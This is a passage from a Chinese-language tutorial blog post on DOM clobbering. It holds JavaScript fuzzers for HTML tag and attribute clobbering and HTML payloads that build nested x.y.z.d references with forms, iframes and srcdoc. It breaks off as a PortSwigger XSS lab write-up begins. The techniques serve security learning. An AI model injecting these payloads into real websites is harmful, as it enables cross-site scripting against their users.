</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>html</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;a&#34;</span><span class=p>,</span><span class=s2>&#34;abbr&#34;</span><span class=p>,</span><span class=s2>&#34;acronym&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>,</span><span class=s2>&#34;applet&#34;</span><span class=p>,</span><span class=s2>&#34;area&#34;</span><span class=p>,</span><span class=s2>&#34;article&#34;</span><span class=p>,</span><span class=s2>&#34;aside&#34;</span><span class=p>,</span><span class=s2>&#34;audio&#34;</span><span class=p>,</span><span class=s2>&#34;b&#34;</span><span class=p>,</span><span class=s2>&#34;base&#34;</span><span class=p>,</span><span class=s2>&#34;basefont&#34;</span><span class=p>,</span><span class=s2>&#34;bdi&#34;</span><span class=p>,</span><span class=s2>&#34;bdo&#34;</span><span class=p>,</span><span class=s2>&#34;bgsound&#34;</span><span class=p>,</span><span class=s2>&#34;big&#34;</span><span class=p>,</span><span class=s2>&#34;blink&#34;</span><span class=p>,</span><span class=s2>&#34;blockquote&#34;</span><span class=p>,</span><span class=s2>&#34;body&#34;</span><span class=p>,</span><span class=s2>&#34;br&#34;</span><span class=p>,</span><span class=s2>&#34;button&#34;</span><span class=p>,</span><span class=s2>&#34;canvas&#34;</span><span class=p>,</span><span class=s2>&#34;caption&#34;</span><span class=p>,</span><span class=s2>&#34;center&#34;</span><span class=p>,</span><span class=s2>&#34;cite&#34;</span><span class=p>,</span><span class=s2>&#34;code&#34;</span><span class=p>,</span><span class=s2>&#34;col&#34;</span><span class=p>,</span><span class=s2>&#34;colgroup&#34;</span><span class=p>,</span><span class=s2>&#34;command&#34;</span><span class=p>,</span><span class=s2>&#34;content&#34;</span><span class=p>,</span><span class=s2>&#34;data&#34;</span><span class=p>,</span><span class=s2>&#34;datalist&#34;</span><span class=p>,</span><span class=s2>&#34;dd&#34;</span><span class=p>,</span><span class=s2>&#34;del&#34;</span><span class=p>,</span><span class=s2>&#34;details&#34;</span><span class=p>,</span><span class=s2>&#34;dfn&#34;</span><span class=p>,</span><span class=s2>&#34;dialog&#34;</span><span class=p>,</span><span class=s2>&#34;dir&#34;</span><span class=p>,</span><span class=s2>&#34;div&#34;</span><span class=p>,</span><span class=s2>&#34;dl&#34;</span><span class=p>,</span><span class=s2>&#34;dt&#34;</span><span class=p>,</span><span class=s2>&#34;element&#34;</span><span class=p>,</span><span class=s2>&#34;em&#34;</span><span class=p>,</span><span class=s2>&#34;embed&#34;</span><span class=p>,</span><span class=s2>&#34;fieldset&#34;</span><span class=p>,</span><span class=s2>&#34;figcaption&#34;</span><span class=p>,</span><span class=s2>&#34;figure&#34;</span><span class=p>,</span><span class=s2>&#34;font&#34;</span><span class=p>,</span><span class=s2>&#34;footer&#34;</span><span class=p>,</span><span class=s2>&#34;form&#34;</span><span class=p>,</span><span class=s2>&#34;frame&#34;</span><span class=p>,</span><span class=s2>&#34;frameset&#34;</span><span class=p>,</span><span class=s2>&#34;h1&#34;</span><span class=p>,</span><span class=s2>&#34;head&#34;</span><span class=p>,</span><span class=s2>&#34;header&#34;</span><span class=p>,</span><span class=s2>&#34;hgroup&#34;</span><span class=p>,</span><span class=s2>&#34;hr&#34;</span><span class=p>,</span><span class=s2>&#34;html&#34;</span><span class=p>,</span><span class=s2>&#34;i&#34;</span><span class=p>,</span><span class=s2>&#34;iframe&#34;</span><span class=p>,</span><span class=s2>&#34;image&#34;</span><span class=p>,</span><span class=s2>&#34;img&#34;</span><span class=p>,</span><span class=s2>&#34;input&#34;</span><span class=p>,</span><span class=s2>&#34;ins&#34;</span><span class=p>,</span><span class=s2>&#34;isindex&#34;</span><span class=p>,</span><span class=s2>&#34;kbd&#34;</span><span class=p>,</span><span class=s2>&#34;keygen&#34;</span><span class=p>,</span><span class=s2>&#34;label&#34;</span><span class=p>,</span><span class=s2>&#34;legend&#34;</span><span class=p>,</span><span class=s2>&#34;li&#34;</span><span class=p>,</span><span class=s2>&#34;link&#34;</span><span class=p>,</span><span class=s2>&#34;listing&#34;</span><span class=p>,</span><span class=s2>&#34;main&#34;</span><span class=p>,</span><span class=s2>&#34;map&#34;</span><span class=p>,</span><span class=s2>&#34;mark&#34;</span><span class=p>,</span><span class=s2>&#34;marquee&#34;</span><span class=p>,</span><span class=s2>&#34;menu&#34;</span><span class=p>,</span><span class=s2>&#34;menuitem&#34;</span><span class=p>,</span><span class=s2>&#34;meta&#34;</span><span class=p>,</span><span class=s2>&#34;meter&#34;</span><span class=p>,</span><span class=s2>&#34;multicol&#34;</span><span class=p>,</span><span class=s2>&#34;nav&#34;</span><span class=p>,</span><span class=s2>&#34;nextid&#34;</span><span class=p>,</span><span class=s2>&#34;nobr&#34;</span><span class=p>,</span><span class=s2>&#34;noembed&#34;</span><span class=p>,</span><span class=s2>&#34;noframes&#34;</span><span class=p>,</span><span class=s2>&#34;noscript&#34;</span><span class=p>,</span><span class=s2>&#34;object&#34;</span><span class=p>,</span><span class=s2>&#34;ol&#34;</span><span class=p>,</span><span class=s2>&#34;optgroup&#34;</span><span class=p>,</span><span class=s2>&#34;option&#34;</span><span class=p>,</span><span class=s2>&#34;output&#34;</span><span class=p>,</span><span class=s2>&#34;p&#34;</span><span class=p>,</span><span class=s2>&#34;param&#34;</span><span class=p>,</span><span class=s2>&#34;picture&#34;</span><span class=p>,</span><span class=s2>&#34;plaintext&#34;</span><span class=p>,</span><span class=s2>&#34;pre&#34;</span><span class=p>,</span><span class=s2>&#34;progress&#34;</span><span class=p>,</span><span class=s2>&#34;q&#34;</span><span class=p>,</span><span class=s2>&#34;rb&#34;</span><span class=p>,</span><span class=s2>&#34;rp&#34;</span><span class=p>,</span><span class=s2>&#34;rt&#34;</span><span class=p>,</span><span class=s2>&#34;rtc&#34;</span><span class=p>,</span><span class=s2>&#34;ruby&#34;</span><span class=p>,</span><span class=s2>&#34;s&#34;</span><span class=p>,</span><span class=s2>&#34;samp&#34;</span><span class=p>,</span><span class=s2>&#34;script&#34;</span><span class=p>,</span><span class=s2>&#34;section&#34;</span><span class=p>,</span><span class=s2>&#34;select&#34;</span><span class=p>,</span><span class=s2>&#34;shadow&#34;</span><span class=p>,</span><span class=s2>&#34;slot&#34;</span><span class=p>,</span><span class=s2>&#34;small&#34;</span><span class=p>,</span><span class=s2>&#34;source&#34;</span><span class=p>,</span><span class=s2>&#34;spacer&#34;</span><span class=p>,</span><span class=s2>&#34;span&#34;</span><span class=p>,</span><span class=s2>&#34;strike&#34;</span><span class=p>,</span><span class=s2>&#34;strong&#34;</span><span class=p>,</span><span class=s2>&#34;style&#34;</span><span class=p>,</span><span class=s2>&#34;sub&#34;</span><span class=p>,</span><span class=s2>&#34;summary&#34;</span><span class=p>,</span><span class=s2>&#34;sup&#34;</span><span class=p>,</span><span class=s2>&#34;svg&#34;</span><span class=p>,</span><span class=s2>&#34;table&#34;</span><span class=p>,</span><span class=s2>&#34;tbody&#34;</span><span class=p>,</span><span class=s2>&#34;td&#34;</span><span class=p>,</span><span class=s2>&#34;template&#34;</span><span class=p>,</span><span class=s2>&#34;textarea&#34;</span><span class=p>,</span><span class=s2>&#34;tfoot&#34;</span><span class=p>,</span><span class=s2>&#34;th&#34;</span><span class=p>,</span><span class=s2>&#34;thead&#34;</span><span class=p>,</span><span class=s2>&#34;time&#34;</span><span class=p>,</span><span class=s2>&#34;title&#34;</span><span class=p>,</span><span class=s2>&#34;tr&#34;</span><span class=p>,</span><span class=s2>&#34;track&#34;</span><span class=p>,</span><span class=s2>&#34;tt&#34;</span><span class=p>,</span><span class=s2>&#34;u&#34;</span><span class=p>,</span><span class=s2>&#34;ul&#34;</span><span class=p>,</span><span class=s2>&#34;var&#34;</span><span class=p>,</span><span class=s2>&#34;video&#34;</span><span class=p>,</span><span class=s2>&#34;wbr&#34;</span><span class=p>,</span><span class=s2>&#34;xmp&#34;</span><span class=p>],</span> <span class=nx>logs</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=nx>div</span><span class=o>=</span><span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;div&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=kd>var</span> <span class=nx>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nx>i</span><span class=o>&lt;</span><span class=nx>html</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span><span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span><span class=p>(</span><span class=kd>var</span> <span class=nx>j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nx>j</span><span class=o>&lt;</span><span class=nx>html</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span><span class=nx>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span><span class=o>=</span><span class=s1>&#39;&lt;&#39;</span><span class=o>+</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39; id=element1&gt;&#39;</span><span class=o>+</span><span class=s1>&#39;&lt;&#39;</span><span class=o>+</span><span class=nx>html</span><span class=p>[</span><span class=nx>j</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39; id=element2&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>element1</span> <span class=o>&amp;&amp;</span> <span class=nx>element1</span><span class=p>.</span><span class=nx>element2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>       <span class=nx>log</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39;,&#39;</span><span class=o>+</span><span class=nx>html</span><span class=p>[</span><span class=nx>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>removeChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>log</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=s1>&#39;\n&#39;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>以上代码测试了现在 HTML5 基本上所有的标签，使用两层的层级关系进行 fuzz ，注意这里只使用了<code>id</code>，并没有使用<code>name</code>，遇上文的<code>HTMLCollection</code>并不是一种方法。</p><p>我们可以得到的是以下关系：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>form-&gt;button
</span></span><span class=line><span class=cl>form-&gt;fieldset
</span></span><span class=line><span class=cl>form-&gt;image
</span></span><span class=line><span class=cl>form-&gt;img
</span></span><span class=line><span class=cl>form-&gt;input
</span></span><span class=line><span class=cl>form-&gt;object
</span></span><span class=line><span class=cl>form-&gt;output
</span></span><span class=line><span class=cl>form-&gt;select
</span></span><span class=line><span class=cl>form-&gt;textarea
</span></span></code></pre></td></tr></table></div></div><p>如果我们想要构建<code>x.y</code>的形式，我们可以这么构建：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span><span class=p>&gt;&lt;</span><span class=nt>output</span> <span class=na>id</span><span class=o>=</span><span class=s>y</span><span class=p>&gt;</span>I&#39;ve been clobbered<span class=p>&lt;/</span><span class=nt>output</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>y</span><span class=p>.</span><span class=nx>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=three-level>Three Level</h3><p>三级的层级关系我们就需要用到以上两种技巧来构建了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;x&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;y&#34;</span><span class=p>&gt;&lt;</span><span class=nt>output</span> <span class=na>id</span><span class=o>=</span><span class=s>z</span><span class=p>&gt;</span>I&#39;ve been clobbered<span class=p>&lt;/</span><span class=nt>output</span><span class=p>&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;x&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>y</span><span class=p>.</span><span class=nx>z</span><span class=p>.</span><span class=nx>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这个也比较简单，先用一个<code>HTMLCollection</code>获取第二级，再在第一个表单中用<code>output</code>标签即可。</p><h3 id=more>More</h3><p>三层层级以上的我们就需要用到<code>iframe</code>与<code>srcdoc</code>来进行配合</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>name</span><span class=o>=</span><span class=s>a</span> <span class=na>srcdoc</span><span class=o>=</span><span class=s>&#34;
</span></span></span><span class=line><span class=cl><span class=s>&lt;iframe srcdoc=&#39;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&#39; name=b&gt;&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>setTimeout</span><span class=p>(()=&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=nx>a</span><span class=p>.</span><span class=nx>b</span><span class=p>.</span><span class=nx>c</span><span class=p>.</span><span class=nx>d</span><span class=p>),</span><span class=mi>500</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>因为需要等待所有的<code>iframe</code>加载完毕我们才能获得这个层级关系，所以需要用到延时，不用延时也可以通过网络请求来进行延缓：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>name</span><span class=o>=</span><span class=s>a</span> <span class=na>srcdoc</span><span class=o>=</span><span class=s>&#34;
</span></span></span><span class=line><span class=cl><span class=s>&lt;iframe srcdoc=&#39;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&#39; name=b&gt;&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;@</span><span class=k>import</span> <span class=s1>&#39;http://example.com&#39;</span><span class=p>;&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>a</span><span class=p>.</span><span class=nx>b</span><span class=p>.</span><span class=nx>c</span><span class=p>.</span><span class=nx>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=custom>Custom</h3><p>以上我们都是通过 id 或者 name 来利用，那我们能不能通过自定义属性来构造呢？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span> <span class=na>y</span><span class=o>=</span><span class=s>123</span><span class=p>&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>y</span><span class=p>)</span><span class=c1>//undefined
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>很明显，这意味着任何未定义的属性都不会具有 DOM 属性，所以就返回了 <code>undefined</code></p><p>我们可以尝试一下 fuzz 所有标签的有没有字符串类型的属性可供我们使用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>html</span> <span class=o>=</span> <span class=p>[...]</span><span class=c1>//HTML elements array
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>props</span><span class=o>=</span><span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=nx>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nx>i</span><span class=o>&lt;</span><span class=nx>html</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span><span class=nx>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=nx>obj</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>   <span class=k>for</span><span class=p>(</span><span class=nx>prop</span> <span class=k>in</span> <span class=nx>obj</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=k>typeof</span> <span class=nx>obj</span><span class=p>[</span><span class=nx>prop</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;string&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>props</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=nx>prop</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span><span class=k>catch</span><span class=p>(</span><span class=nx>e</span><span class=p>){}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>([...</span><span class=k>new</span> <span class=nx>Set</span><span class=p>(</span><span class=nx>props</span><span class=p>)].</span><span class=nx>join</span><span class=p>(</span><span class=s1>&#39;\n&#39;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>我们可以得到一系列标签字符串类型的属性，例如:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a:username
</span></span><span class=line><span class=cl>a:password
</span></span></code></pre></td></tr></table></div></div><p>但是这仅仅得到的只是知道它们属性为字符串类型，我们需要知道能不能利用，于是我们需要加上一些东西来进行验证</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>html</span> <span class=o>=</span> <span class=p>[...]</span><span class=c1>//HTML elements array
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>props</span><span class=o>=</span><span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=nx>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nx>i</span><span class=o>&lt;</span><span class=nx>html</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span><span class=nx>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=nx>obj</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span><span class=p>(</span><span class=nx>prop</span> <span class=k>in</span> <span class=nx>obj</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=k>typeof</span> <span class=nx>obj</span><span class=p>[</span><span class=nx>prop</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;string&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>DOM</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s1>&#39;&lt;&#39;</span><span class=o>+</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39; id=x &#39;</span><span class=o>+</span><span class=nx>prop</span><span class=o>+</span><span class=s1>&#39;=1&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;x&#39;</span><span class=p>)[</span><span class=nx>prop</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=nx>props</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=nx>prop</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>catch</span><span class=p>(</span><span class=nx>e</span><span class=p>){}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>([...</span><span class=k>new</span> <span class=nx>Set</span><span class=p>(</span><span class=nx>props</span><span class=p>)].</span><span class=nx>join</span><span class=p>(</span><span class=s1>&#39;\n&#39;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>我们可以得到一系列的标签以及其属性名称，例如我们可以利用其中的<code>a:title</code>来进行组合</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span> <span class=na>title</span><span class=o>=</span><span class=s>&#39;hasaki&#39;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>title</span><span class=p>);</span><span class=c1>//hasaki
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>其中在我们第一步得到的属性中比较有意思的是 a 标签的<code>username</code>跟<code>password</code>属性，虽然我们不能直接通过<code>title</code>这种形式利用，但是我们可以通过<code>href</code>的形式来进行利用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;ftp:Clobbered-username:Clobbered-Password@a&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>username</span><span class=p>)</span><span class=c1>//Clobbered-username
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>password</span><span class=p>)</span><span class=c1>//Clobbered-password
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=exploit-example>Exploit Example</h2><p>PostWigger 提供了两个实验环境 <a class=link href=https://portswigger.net/web-security/dom-based/dom-clobbering target=_blank rel=noopener>https://portswigger.net/web-security/dom-based/dom-clobbering</a>，</p><h3 id=lab-exploiting-dom-clobbering-to-enable-xss>Lab: Exploiting DOM clobbering to enable XSS</h3><blockquote><p>​ This lab contains a DOM-clobbering vulnerability. The comment functionality allows &ldquo;safe&rdquo; HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses <a class=link href=https://portswigger.net/web-security/cross-site-scripting target=_blank rel=noopener>XSS</a> to call the alert() function.</p></blockquote><p>这个实验我们可以在<code>resources/js/loadCommentsWithDomPurify.js</code>路由找到这个 JS 文件，在<code>displayComments()</code>函数中我们又可以发现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
